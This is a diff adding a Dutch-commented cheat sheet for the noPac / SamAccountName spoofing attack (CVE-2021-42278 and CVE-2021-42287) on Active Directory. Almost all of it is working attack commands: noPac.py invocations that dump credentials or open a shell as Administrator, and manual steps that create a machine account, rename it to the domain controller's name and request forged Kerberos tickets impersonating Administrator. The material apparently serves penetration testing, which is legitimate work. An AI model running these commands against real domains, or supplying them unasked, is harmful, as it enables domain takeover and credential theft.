@@ -1,0 +1,34 @@
+# noPac / SamAccountName Spoofing — CVE-2021-42278 + CVE-2021-42287
+# Hernoem machine account naar DC naam → vraag TGS aan → impersonate DC
+#
+# === Vereisten ===
+# - Domein user account
+# - Machine account quota > 0 (standaard: 10)
+# - Ongepatchte DC (pre-november 2021)
+#
+# === Voorbeelden ===
+
+# Automatische exploit (Python)
+python3 noPac.py DOMAIN/USER:'PASS' -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate Administrator -dump
+
+# Alleen check (niet exploiten)
+python3 noPac.py DOMAIN/USER:'PASS' -dc-ip DC_IP -dc-host DC_HOSTNAME -check
+
+# Shell verkrijgen
+python3 noPac.py DOMAIN/USER:'PASS' -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate Administrator -shell
+
+# Handmatige stappen:
+# 1. Machine account aanmaken
+python3 addcomputer.py DOMAIN/USER:'PASS' -computer-name 'YOURPC$' -computer-pass 'CompPass123!'
+# 2. SamAccountName wijzigen naar DC naam (zonder $)
+python3 renameMachine.py DOMAIN/USER:'PASS' -current-name 'YOURPC$' -new-name DC_HOSTNAME -dc-ip DC_IP
+# 3. TGT aanvragen als "DC"
+python3 getTGT.py DOMAIN/DC_HOSTNAME:'CompPass123!' -dc-ip DC_IP
+# 4. S4U2Self voor Administrator ticket
+python3 getST.py DOMAIN/DC_HOSTNAME -spn cifs/DC_FQDN -impersonate Administrator -dc-ip DC_IP
+# 5. Naam terugzetten
+python3 renameMachine.py DOMAIN/USER:'PASS' -current-name DC_HOSTNAME -new-name 'YOURPC$' -dc-ip DC_IP
+
+# Noot: Gepatcht in november 2021 update
+# Noot: Zeer snelle path naar Domain Admin als ongepacht
+# Noot: MachineAccountQuota=0 blokkeert stap 1
